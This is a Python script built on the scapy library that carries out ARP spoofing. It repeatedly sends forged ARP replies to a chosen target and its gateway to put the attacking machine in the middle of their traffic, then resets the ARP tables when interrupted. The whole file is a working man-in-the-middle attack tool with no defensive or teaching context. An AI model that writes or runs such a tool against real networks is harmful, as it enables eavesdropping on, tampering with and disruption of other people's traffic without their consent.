#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target ip")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway ip")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target ip, use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify a gateway ip, use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    # print(scapy.ls(scapy.ARP))
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), \
                       psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, count=4, verbose=False)

def main():
    options = get_arguments()
    target_ip = options.target
    gateway_ip = options.gateway

    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"\r[+] Packets sent: {str(sent_packets_count)}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C ... Resetting ARP tables... Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

if __name__ == "__main__":
    main()